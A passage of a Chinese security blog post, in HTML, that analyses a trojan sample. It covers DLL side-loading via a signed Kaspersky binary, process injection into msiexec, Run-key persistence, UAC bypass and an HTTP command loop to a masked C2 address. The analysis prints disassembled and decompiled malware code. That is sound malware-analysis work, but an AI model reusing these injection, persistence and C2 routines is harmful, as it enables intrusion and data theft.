+003628B0                         53                  push ebx
+003628B1                         FF15 7C403600       call dword ptr ds:[0x36407C]               ; kernel32.CloseHandle
+003628B7                         8D85 CCF9FFFF       lea eax,dword ptr ss:[ebp-0x634]
+003628BD                         50                  push eax
+003628BE                         8D85 88F9FFFF       lea eax,dword ptr ss:[ebp-0x678]
+003628C4                         50                  push eax
+003628C5                         56                  push esi
+003628C6                         56                  push esi
+003628C7                         6A 04               push 0x4
+003628C9                         6A 01               push 0x1
+003628CB                         56                  push esi
+003628CC                         56                  push esi
+003628CD                         8D85 E4F9FFFF       lea eax,dword ptr ss:[ebp-0x61C]
+003628D3                         50                  push eax
+003628D4                         8D85 ECFBFFFF       lea eax,dword ptr ss:[ebp-0x414]
+003628DA                         50                  push eax
+003628DB                         FF15 84403600       call dword ptr ds:[0x364084]               ; kernel32.CreateProcessW
+003628E1                         85C0                test eax,eax
+003628E3                       ^ 0F84 6EFFFFFF       je 00362857
+003628E9                         6A 40               push 0x40
+003628EB                         68 00300000         push 0x3000
+003628F0                         8D47 01             lea eax,dword ptr ds:[edi+0x1]
+003628F3                         50                  push eax
+003628F4                         56                  push esi
+003628F5                         FFB5 CCF9FFFF       push dword ptr ss:[ebp-0x634]
+003628FB                         FF15 B0403600       call dword ptr ds:[0x3640B0]               ; kernel32.VirtualAllocEx
+00362901                         8BD8                mov ebx,eax
+00362903                         3BDE                cmp ebx,esi
+00362905                       ^ 0F84 4CFFFFFF       je 00362857
+0036290B                         56                  push esi
+0036290C                         57                  push edi
+0036290D                         FFB5 E0F9FFFF       push dword ptr ss:[ebp-0x620]
+00362913                         53                  push ebx
+00362914                         FFB5 CCF9FFFF       push dword ptr ss:[ebp-0x634]
+0036291A                         FF15 C0403600       call dword ptr ds:[0x3640C0]               ; kernel32.WriteProcessMemory
+00362920                         85C0                test eax,eax
+00362922                       ^ 0F84 2FFFFFFF       je 00362857
+00362928                         56                  push esi
+00362929                         56                  push esi
+0036292A                         56                  push esi
+0036292B                         53                  push ebx
+0036292C                         56                  push esi
+0036292D                         56                  push esi
+0036292E                         FFB5 CCF9FFFF       push dword ptr ss:[ebp-0x634]
+00362934                         FF15 94403600       call dword ptr ds:[0x364094]               ; kernel32.CreateRemoteThread
+</code></pre><p>4.<br>msiexec 中的 shellcode 再次在内存解密执行木马核心dll，由于此时的参数发生变化，已经存在上线的ip和端口，代码流程发生变化，通过设置注册的HKCU\Software\Microsoft\Windows\CurrentVersion\Run\kav 位置设置自启动的程序 “C:\ProgramData\kav\svchost.exe”</p>
+<pre><code>  if ( pNumArgs == 4 )
+  {
+    InitAndSetAuto();
+    v5 = wtoi(v4[3]);
+    v6 = wtoi(v4[2]);
+    NetWork(v4[1], v6, v5);
+  }
+  if ( pNumArgs == 1 )
+  {
+    MoveAndPassUac();
+    v7 = atoi(Str);
+    if ( !CreatePuppet(v7) )
+    {
+      v8 = atoi(Str);
+      NetWork(&amp;szServerName, v8, 1);
+    }
+    ExitProcess(0);
+  }
+
+
+设置svchost.exe（原setup.exe）自启动
+((void (__cdecl *)(char *, _DWORD, signed int))dword_363AD8)(&amp;v5, 0, 518);
+wsprintfW(&amp;String, &amp;word_36478C, a1);
+result = RegCreateKeyExW(HKEY_CURRENT_USER, &amp;SubKey, 0, 0, 0, 0xF003Fu, 0, &amp;phkResult, 0);
+if ( !result )
+{
+  v2 = lstrlenW(&amp;String);
+  RegSetValueExW(phkResult, &amp;ValueName, 0, 1u, (const BYTE *)&amp;String, 2 * v2);
+  result = RegCloseKey(phkResult);
+}
+</code></pre><p>5.<br>木马通过http协议与远程服务器进行通信</p>
+<p>IP：103.xx.x.x4<br>Port：443</p>
+<pre><code>.text:003618A7 pushebx ; dwFlags
+.text:003618A8 pushebx ; lpszProxyBypass
+.text:003618A9 pushebx ; lpszProxy
+.text:003618AA pushebx ; dwAccessType
+.text:003618AB pushoffset szAgent  ; &quot;HttpBrowser/1.0&quot;
+.text:003618B0 mov [esp+434h+var_410], ebx
+.text:003618B4 callds:InternetOpenW
+.text:003618BA cmp eax, ebx
+.text:003618BC jz  loc_361A28
+.text:003618C2 pushebx ; dwContext
+.text:003618C3 pushebx ; dwFlags
+.text:003618C4 push3   ; dwService
+.text:003618C6 pushebx ; lpszPassword
+.text:003618C7 pushebx ; lpszUserName
+.text:003618C8 pushdword ptr [ebp+nServerPort] ; nServerPort
+.text:003618CB pushesi ; lpszServerName
+.text:003618CC pusheax ; hInternet
+.text:003618CD callds:InternetConnectW
+</code></pre><p>经分析，木马包含上传，下载等主要功能   </p>
+<pre><code> while ( 1 )
+{
+  if ( SendGetPack(v5, a3, &amp;MultiByteStr) )
+  {
+    v6 = sub_363570(&amp;MultiByteStr);
+    if ( sub_36318C(L&quot;init&quot;, v6) )
+    {
+      v7 = 0;
+      a3 = 1;
+      sub_362BC4();
+      sub_3629E3(v5);
+      sub_361000(v5);
+    }
+    else if ( sub_36318C(L&quot;write&quot;, v6) )
+    {
+      v7 = 0;
+      a3 = 1;
+      sub_362C65(v6 + 6);
+    }
+    else if ( sub_36318C(L&quot;list&quot;, v6) )
+    {
+      v7 = 0;
+      a3 = 1;
+      GetFileList(v5, 0);
+    }
+    else if ( sub_36318C(L&quot;upload&quot;, v6) )
+    {
+      v7 = 0;
+      a3 = 1;
+      uploadfunc(v6 + 7);
+      GetFileList(v8, 1);
+      v5 = v8;
+    }
+    else if ( sub_36318C(L&quot;down&quot;, v6) )
+    {
+      v7 = 0;
+      a3 = 1;
+      downfunc((int)v5, v6 + 5);
+    }
+    else if ( v7 &gt;= 10 || (++v7, v7 &gt;= 10) )
+    {
+      a3 = 10;
+    }
+    operator delete(v6);
+  }
+  Sleep(1000 * a3);
+}
+</code></pre><h1 id="三、样本分析总结"><a href="#三、样本分析总结" class="headerlink" title="三、样本分析总结"></a>三、样本分析总结</h1><p>该样本的工作流程为：</p>
+<p><em>&gt;280836636原始样本 在临时目录释放 3个文件，并启动其中带有 Kaspersky Lab 数字签名的 setup.exe，之后自删除</em></p>
+<p><em>&gt;setup.exe 被执行后加载释放的 msi.dll，白加黑</em></p>
+<p><em>&gt;msi.dll 解析并加载释放的 msi.dll.url 文件，这个文件包含一段 shellcode 及 木马的核心dll</em></p>
+<p><em>&gt;msi.dll.url 解密自身代码，在内存中释放并执行 木马的核心dll</em></p>
+<p><em>&gt;木马核心dll 根据自身参数 移动 temp目录 下的三个文件到指定目录，包含uac绕过，创建傀儡载体，设置自启动 及 正常上线通信功能</em></p>
+
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/blog/2017/06/27/hello-world/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.png" alt="b2ahex's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        youremail@email.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/blog/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/blog/archives/2017/06/">六月 2017<span class="sidebar_archives-count">2</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+
+    <!-- Pages  -->
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
+        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
+            主题 - Material
+            <span class="sidebar-badge badge-circle">i</span>
+        </div>
+    </a>
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/twitter" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+        <a href="https://www.facebook.com/facebook" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
+                <span class="visuallyhidden">Facebook</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>b2ahex's blog
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import File -->
+
+
+    <script>lsloader.load("js/lazyload.min.js","/blog/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==")</script>
+    <script>lsloader.load("js/js.min.js","/blog/js/js.min.js?oAl/+lvaqTFV31JXTmbrNA==")</script>
+
+
+
+    <script>lsloader.load("js/nprogress.js","/blog/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==")</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/blog/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Window Load-->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+</script>
+
+<!-- MathJax Load-->
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Bing Background -->
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.4.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
